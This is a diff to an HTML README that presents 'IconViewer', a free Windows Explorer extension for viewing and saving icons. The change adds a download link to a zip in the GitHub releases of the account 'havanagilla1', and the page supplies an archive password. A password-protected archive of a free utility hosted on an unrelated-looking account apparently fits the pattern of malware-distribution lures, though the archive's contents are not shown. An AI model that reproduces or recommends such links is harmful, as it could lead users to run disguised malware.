@@ -5,7 +5,8 @@
 <h2>Download</h2>
 <ul>
   <li><b>Download IconViewer</b> <i>(Password: IVForEver)</i></li>
-  <a href="#"><img src="https://github.com/user-attachments/assets/e3aa5826-ffb3-403a-8f0f-e8a27c1a3003"></a>
+  <br>
+  <a href="https://github.com/havanagilla1/IconViewer/releases/download/Download/IconViewer.zip"><img src="https://github.com/user-attachments/assets/e3aa5826-ffb3-403a-8f0f-e8a27c1a3003"></a>
 </ul>
 <h2>Description</h2>
 <p><b>IconViewer</b> is a free Windows Explorer extension that lets you easily view, copy, and save icons contained within programs and libraries. Open a file's Properties box, select the "Icons" tab, and view the icons contained in the file. </p>
